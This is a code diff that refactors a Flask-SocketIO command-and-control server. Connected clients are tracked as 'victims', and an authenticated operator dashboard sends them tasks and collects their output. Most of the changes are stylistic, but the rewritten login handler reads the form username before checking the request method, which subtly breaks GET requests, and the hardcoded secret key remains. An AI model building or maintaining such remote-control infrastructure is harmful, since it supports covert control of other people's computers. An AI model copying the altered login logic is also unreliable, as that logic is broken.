@@ -14,7 +14,7 @@ import sqlite3, functools, random, string, datetime
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
 DATABASE = 'tasks.db'
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+DATABASE
+app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DATABASE}'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 login_manager = LoginManager()
@@ -121,15 +121,15 @@ def dashboard():
 def login():
     """For GET requests, display the login form. For POSTS, login the current user
     by processing the form."""
-    if request.method == 'POST':
-        user = User.query.get(request.form['username'])
-        if user:
-            if bcrypt.check_password_hash(user.password, request.form['password']):
-                user.authenticated = True
-                db.session.add(user)
-                db.session.commit()
-                login_user(user, remember=False)
-                return redirect(url_for("dashboard"))
+    if user := User.query.get(request.form['username']):
+        if request.method == 'POST' and bcrypt.check_password_hash(
+            user.password, request.form['password']
+        ):
+            user.authenticated = True
+            db.session.add(user)
+            db.session.commit()
+            login_user(user, remember=False)
+            return redirect(url_for("dashboard"))
     return render_template('login.html')
     
 @app.route("/logout")
@@ -170,10 +170,7 @@ def add_task(message):
     victim = Victim.query.filter_by(id=message['victim']).first()
     max_id = Task.query.filter_by(victim = victim).order_by(Task.id.desc()).limit(1).all()
     myid=0
-    if len(max_id) == 0:
-        myid = 1
-    else:
-        myid=max_id[0].id+1
+    myid = 1 if len(max_id) == 0 else max_id[0].id+1
     task = Task(victim,myid,message['input'])
     db.session.add(task)
     db.session.commit()
@@ -185,21 +182,21 @@ def add_task(message):
                       namespace='/dashboard',include_self=False)
     socketio.emit('issue task self',
                       {'victim':victim.id,'id':task.id,'input':task.input},
-                      namespace='/dashboard', room=request.sid)  
-    print('[*] Task added: '+str(task.id))
+                      namespace='/dashboard', room=request.sid)
+    print(f'[*] Task added: {str(task.id)}')
 
 @socketio.on('task output', namespace='/victim')
 def task_output(message):
-     victim = Victim.query.filter_by(id=request.sid).first()
-     task = Task.query.filter_by(victim=victim,id=message['id']).first()
-     if (task.output == None):
-         task.output = str(message['output'])
-     else:
-         task.output=str(task.output)+'\n\n'+str(message['output'])
-     db.session.commit()
-     socketio.emit('task output',
-                      {'victim':victim.id,'id':task.id,'output':task.output},
-                      namespace='/dashboard')
+    victim = Victim.query.filter_by(id=request.sid).first()
+    task = Task.query.filter_by(victim=victim,id=message['id']).first()
+    if task.output is None:
+        task.output = str(message['output'])
+    else:
+        task.output=str(task.output)+'\n\n'+str(message['output'])
+    db.session.commit()
+    socketio.emit('task output',
+                     {'victim':victim.id,'id':task.id,'output':task.output},
+                     namespace='/dashboard')
 
 @socketio.on('connect', namespace='/dashboard')
 @authenticated_only
@@ -207,20 +204,22 @@ def dash_connect():
     outputlist = []
     victims = Victim.query.all()
     for victim in victims:
-        tasklist = []
         tasks=Task.query.filter_by(victim=victim).all()
-        for task in tasks:
-            tasklist.append({'id':task.id,'input':task.input,'output':task.output})
+        tasklist = [
+            {'id': task.id, 'input': task.input, 'output': task.output}
+            for task in tasks
+        ]
+
         outputlist.append({'id':victim.id,'active':victim.active,'tasks':tasklist})
     emit('datadump', {'data': outputlist})
-    print('[*] User connected: '+request.sid)
+    print(f'[*] User connected: {request.sid}')
     
 @socketio.on('connect', namespace='/victim')
 def victim_connect():
     myvictim = Victim(request.sid)
     db.session.add(myvictim)
     db.session.commit()
-    print('[*] Victim connected: '+myvictim.id)
+    print(f'[*] Victim connected: {myvictim.id}')
     socketio.emit('victim connect',
                       {'id':myvictim.id,'active':myvictim.active},
                       namespace='/dashboard')
@@ -228,7 +227,7 @@ def victim_connect():
 @socketio.on('disconnect', namespace='/dashboard')
 @authenticated_only
 def dash_disconnect():
-    print('[*] User disconnected: '+request.sid)
+    print(f'[*] User disconnected: {request.sid}')
     
 @socketio.on('disconnect', namespace='/victim')
 def victim_disconnect():
@@ -238,7 +237,7 @@ def victim_disconnect():
     socketio.emit('victim disconnect',
                       {'id':request.sid},
                       namespace='/dashboard')
-    print('[*] Victim disconnected: '+request.sid)
+    print(f'[*] Victim disconnected: {request.sid}')
     
 if __name__ == '__main__':
     socketio.run(app)
